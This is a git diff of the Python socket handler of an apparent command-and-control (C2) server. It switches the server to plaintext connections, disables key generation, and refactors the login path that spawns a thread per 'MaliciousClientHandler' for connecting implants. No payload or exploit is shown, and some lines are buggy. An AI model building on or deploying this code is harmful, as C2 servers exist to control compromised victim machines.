@@ -126,8 +126,8 @@ class ServerSockHandler:
         self.json_parser = json_parser.json_ops()
 
         # generating global priv & pub keys
-        self.encryption = Encryptor(key_length=2048)
-        self.encryption.generate_keys()
+        #self.encryption = Encryptor(key_length=2048)
+        #self.encryption.generate_keys()
 
         # sanity check that keys got generated
         #print(len(encryption.private_key))
@@ -189,17 +189,25 @@ class ServerSockHandler:
         ## I kinda wanna name this loop, cascade sounds cool
         while True:
         ##== Initial handling of client
-            ssl_socket = self.server_ssl_handler()
+            
+            # Cheap & dirty way to flip SSL on when ready
+            SSL = False
+            if SSL:
+                serversocket = self.server_ssl_handler()
 
-            if not ssl_socket:
-                continue
+
+            else:
+                serversocket = self.server_plaintext_handler()
+            
+            ## catching socket errors
+            if not serversocket:
+                    continue
 
         ##### MOVE TO INDEPENDENT FILE ####
         ##== Parsing the message sent to the server. 
             try:
-                # English: Hey, I (server) wants to recieve a message. Not sure if encrypted or not, passing my private key to the decrypt function just in case
-                #response = receive_msg(conn=ssl_socket, private_key=self.encryption.private_key)
-                response = Comms.CommsHandler.receive_msg(conn=ssl_socket)
+                # Waiting on client to send followup message
+                response = Comms.CommsHandler.receive_msg(conn=serversocket)
 
                 ## Converting to json. Validation is disabled during dev.
                 response_from_client = self.json_parser.convert_and_validate(response)
@@ -210,7 +218,7 @@ class ServerSockHandler:
                     message        = response_from_client["msg"]["msg_command"]
                     action         = response_from_client["general"]["action"]
 
-                    print(f"DEBUG: MSG Breakdown\n\tSelf.client_type: {self.client_type}\n\tself.id: {self.id}\n\tself.message: {self.message}\n\tself.action: {self.action}\n\n")
+                    print(f"DEBUG: MSG Breakdown\n\tclient_type:\t {client_type}\n\tid:\t\t {id}\n\tmessage:\t {message}\n\taction:\t\t {action}\n\n")
                 else:
                     print("Nothing recieved from client")
 
@@ -223,18 +231,18 @@ class ServerSockHandler:
             ## !_userlogin_!: A friendly client trying to log in    
             
             ## == Decisions based on parsed messages
-            if self.action == "!_userlogin_!":
+            if action == "!_userlogin_!":
                 ## If function returns false, continue the loop. IMO that's the easiest way to handle a failure here
                 if not self.userloginhandler(
                     response_from_client=response_from_client,
-                    ssl_conn = ssl_socket):
+                    serversocket = serversocket):
                     
                     continue
              
             ## !_client_! handler
-            elif self.action == "!_clientlogin_!":
+            elif action == "!_clientlogin_!":
                 if not self.clientloginhandler(
-                    ssl_conn = ssl_socket,
+                    serversocket = serversocket,
                     response_from_client=response_from_client):
                     
                     continue
@@ -243,12 +251,12 @@ class ServerSockHandler:
             elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
                 ## I should capture these too and see whos hitting it
                 ## immediatly drop connection, and mayyyybe add to a blocklist, but you could lose legit clients that way
-                self.conn.close()
+                serversocket.close()
                 logging.debug("Recieved HTTP Request to C2 server... closing connection")
                 
             else:
-                logging.warning(f"Unexpected Connection from {self.client_remote_ip_port}. Received: {self.response} ")
-                self.conn.close()
+                logging.warning(f"Unexpected Connection from {self.client_remote_ip_port}. Action: {action} ")
+                serversocket.close()
 
 
     def server_ssl_handler(self) -> socket:
@@ -291,6 +299,32 @@ class ServerSockHandler:
             logging.debug(f"[Server (server_ssl_handler)] Unkown Error: {type(e)}")
             return False     
   
+    def server_plaintext_handler(self) -> socket:
+        """Handles plaintext communication. It accepts incoming connections, and returns a socket.
+
+        Returns:
+            socket: The socket on which the client is communicating on. 
+        """
+        try:
+            non_ssl_conn, addr = self.server.accept()
+
+        ## Getting client id from the client, and the IP address
+            ## this var is only used for printing info, not as any 'real' data
+            self.client_remote_ip_port = f"{non_ssl_conn.getpeername()[0]}:{non_ssl_conn.getpeername()[1]}"
+            logging.debug(f"\n[{self.client_remote_ip_port} -> Server] [New Instance] Accepted Connection from: {self.client_remote_ip_port}")
+
+            return non_ssl_conn
+
+        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
+            logging.warning(f"[Server (server_ssl_handler)] Client {self.client_remote_ip_port} disconnected")
+            return False
+        except FileNotFoundError as fnfe:
+            logging.debug(f"[Server (server_ssl_handler)] Missing a file, either .CRT or .KEY: {type(e)}")
+
+        except Exception as e:
+            logging.debug(f"[Server (server_ssl_handler)] Unkown Error: {type(e)}")
+            return False
+
     def socket_cleanup(self):
         """A cleanup function that is run on any type of exit. it makes sure the socket is closed properly
         & no errors are run into. Left fairly empty for now, may have more use in the future.
@@ -304,7 +338,7 @@ class ServerSockHandler:
         except Exception as e:
             logging.warning(f"{self.SxXX}:{e}")  
 
-    def userloginhandler(self, response_from_client, ssl_conn):
+    def userloginhandler(self, response_from_client, serversocket):
         '''
         This function:
             - Sees if a client has logged in before
@@ -372,7 +406,7 @@ class ServerSockHandler:
             Comms.CommsHandler.send_msg(msg="1", conn=self.conn)
             logging.critical(f"[{self.client_remote_ip_port} -> Server (Logon)] Failed logon from '{username}'")  
 
-    def clientloginhandler(self, ssl_conn, response_from_client):
+    def clientloginhandler(self, serversocket, response_from_client):
         '''
         This function:
             - Sees if a client has logged in before
@@ -381,47 +415,46 @@ class ServerSockHandler:
 
         Note, if there is an exception, the function returns to continue on with the conn loop. might take some work
         
+
+        ## Bulletproofed as of 07/26/2023
         '''
-        id = None
         try:
-            # Try to extract the username and password from the message
-             #username, password = self.id, self.message
             id = response_from_client["general"]["client_id"]
-        
-        except ValueError as e:
-                    # If there is a value error, set the username and password to None
-            logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
+        except KeyError as e:
+            logging.debug(f"Invalid login message format: {e}")
             return False
-        
-        except Exception as e:
-            # If there is any other exception, set the username and password to None
-            logging.debug(f"Unknown error with logon process: {e}")
+
+        if id is None:
+            logging.debug("Client ID is None")
             return False
-        
-        # construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
-        #client_name = "client_" + self.conn.getpeername()[0].replace(".", "_") + "_" + self.id
 
         try:
-            #note, ssl_conn.getpeername may not work
-            client_name = "client_" + self.ssl_conn.getpeername()[0].replace(".", "_") + "_" + self.id
-            
-            # If client is not in current clients list, add it
+            # Construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
+            client_name = "client_" + serversocket.getpeername()[0].replace(".", "_") + "_" + id
+
             if client_name not in self.current_clients:
                 self.current_clients.append(client_name)
 
-                # Create a new malicious client handler instance and add it to the clients dict
-                self.clients[client_name] = ClientEngine.MaliciousClientHandler.ServerMaliciousClientHandler()
-                globals()[client_name] = self.clients[client_name]
+            # Create a new malicious client handler instance and add it to the clients dict
+            self.clients[client_name] = ClientEngine.MaliciousClientHandler.ServerMaliciousClientHandler()
 
             # Create a new thread for this client's communication
             threading.Thread(
                 target=self.clients[client_name].handle_client,
-                args=(ssl_conn, self.response, id)
-                ).start()  
+                args=(serversocket, response_from_client, id)
+            ).start()
+
+            logging.debug(f"Server (clientloginhandler)] Client '{id}' accepted, new thread created")
+
+        except KeyError as e:
+            logging.debug(f"Missing key in login message: {e}")
+            return False
 
         except Exception as e:
             logging.debug(f"Server (clientloginhandler)] Unknown Error: {e}")
-            return False
+            raise  # Let the exception propagate, don't return False
+
+        return True
 
 
 def continue_anyways():
